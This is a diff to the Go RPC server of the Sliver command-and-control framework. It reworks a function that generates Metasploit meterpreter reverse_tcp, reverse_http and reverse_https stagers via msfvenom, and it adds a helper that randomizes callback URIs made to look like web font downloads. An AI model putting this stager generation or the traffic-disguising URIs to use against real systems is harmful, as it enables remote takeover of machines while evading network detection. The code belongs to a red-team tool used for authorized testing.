@@ -21,12 +21,15 @@ package rpc
 import (
 	"context"
 	"fmt"
+	"math/rand"
+	"path"
 	"time"
 
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/server/core"
+	"github.com/bishopfox/sliver/server/generate"
 	"github.com/bishopfox/sliver/server/msf"
 
 	"github.com/golang/protobuf/proto"
@@ -59,7 +62,7 @@ func (rpc *Server) Msf(ctx context.Context, req *clientpb.MSFReq) (*commonpb.Emp
 		Data:     rawPayload,
 		RWXPages: true,
 	})
-	timeout := time.Duration(req.Request.Timeout)
+	timeout := rpc.getTimeout(req)
 	_, err = session.Request(sliverpb.MsgTaskReq, timeout, data)
 	if err != nil {
 		return nil, err
@@ -88,14 +91,14 @@ func (rpc *Server) MsfRemote(ctx context.Context, req *clientpb.MSFRemoteReq) (*
 	if err != nil {
 		return nil, err
 	}
-	data, _ := proto.Marshal(&sliverpb.RemoteTaskReq{
+	data, _ := proto.Marshal(&sliverpb.TaskReq{
 		Pid:      req.PID,
 		Encoder:  "raw",
 		Data:     rawPayload,
 		RWXPages: true,
 	})
-	timeout := time.Duration(req.Request.Timeout)
-	_, err = session.Request(sliverpb.MsgRemoteTaskReq, timeout, data)
+	timeout := rpc.getTimeout(req)
+	_, err = session.Request(sliverpb.MsgTaskReq, timeout, data)
 	if err != nil {
 		return nil, err
 	}
@@ -103,49 +106,90 @@ func (rpc *Server) MsfRemote(ctx context.Context, req *clientpb.MSFRemoteReq) (*
 }
 
 // MsfStage - Generate a MSF compatible stage
-func (rpc *Server) MsfStage(config *clientpb.EggConfig) ([]byte, error) {
+func (rpc *Server) MsfStage(ctx context.Context, req *clientpb.MsfStagerReq) (*clientpb.MsfStager, error) {
 	var (
-		stage   []byte
+		MSFStage = &clientpb.MsfStager{
+			File: &commonpb.File{},
+		}
 		payload string
 		arch    string
 		uri     string
 	)
 
-	switch config.Arch {
+	switch req.GetArch() {
 	case "amd64":
 		arch = "x64"
 	default:
 		arch = "x86"
 	}
 
-	// TODO: change the hardcoded URI to something dynamically generated
-	switch config.Protocol {
-	case clientpb.EggConfig_TCP:
+	switch req.Protocol {
+	case clientpb.StageProtocol_TCP:
 		payload = "meterpreter/reverse_tcp"
-	case clientpb.EggConfig_HTTP:
+	case clientpb.StageProtocol_HTTP:
 		payload = "meterpreter/reverse_http"
-		uri = "/login.do"
-	case clientpb.EggConfig_HTTPS:
+		uri = generateCallbackURI()
+	case clientpb.StageProtocol_HTTPS:
 		payload = "meterpreter/reverse_https"
-		uri = "/login.do"
+		uri = generateCallbackURI()
 	default:
-		return stage, fmt.Errorf("Protocol not supported")
+		return MSFStage, fmt.Errorf("Protocol not supported")
+	}
+
+	// We only support windows at the moment
+	if req.GetOS() != "windows" {
+		return MSFStage, fmt.Errorf("%s is currently not supported", req.GetOS())
 	}
 
 	venomConfig := msf.VenomConfig{
-		Os:       "windows", // We only support windows at the moment
+		Os:       req.GetOS(),
 		Payload:  payload,
-		LHost:    config.Host,
-		LPort:    uint16(config.Port),
+		LHost:    req.GetHost(),
+		LPort:    uint16(req.GetPort()),
 		Arch:     arch,
-		Format:   config.Format,
-		BadChars: []string{"\\x0a", "\\x00"}, // TODO: make this configurable
+		Format:   req.GetFormat(),
+		BadChars: req.GetBadChars(), // TODO: make this configurable
 		Luri:     uri,
 	}
+
 	stage, err := msf.VenomPayload(venomConfig)
 	if err != nil {
 		rpcLog.Warnf("Error while generating msf payload: %v\n", err)
-		return stage, err
+		return MSFStage, err
 	}
-	return stage, nil
+	MSFStage.File.Data = stage
+	name, err := generate.GetCodename()
+	if err != nil {
+		return MSFStage, err
+	}
+	MSFStage.File.Name = name
+	return MSFStage, nil
+}
+
+// Utility functions
+func generateCallbackURI() string {
+	segments := []string{"static", "assets", "fonts", "locales"}
+	// Randomly picked font while browsing on the web
+	fontNames := []string{
+		"attribute_text_w01_regular.woff",
+		"ZillaSlab-Regular.subset.bbc33fb47cf6.woff",
+		"ZillaSlab-Bold.subset.e96c15f68c68.woff",
+		"Inter-Regular.woff",
+		"Inter-Medium.woff",
+	}
+	return path.Join(randomPath(segments, fontNames)...)
+}
+
+func randomPath(segments []string, filenames []string) []string {
+	seed := rand.NewSource(time.Now().UnixNano())
+	insecureRand := rand.New(seed)
+	n := insecureRand.Intn(3) // How many segements?
+	genSegments := []string{}
+	for index := 0; index < n; index++ {
+		seg := segments[insecureRand.Intn(len(segments))]
+		genSegments = append(genSegments, seg)
+	}
+	filename := filenames[insecureRand.Intn(len(filenames))]
+	genSegments = append(genSegments, filename)
+	return genSegments
 }
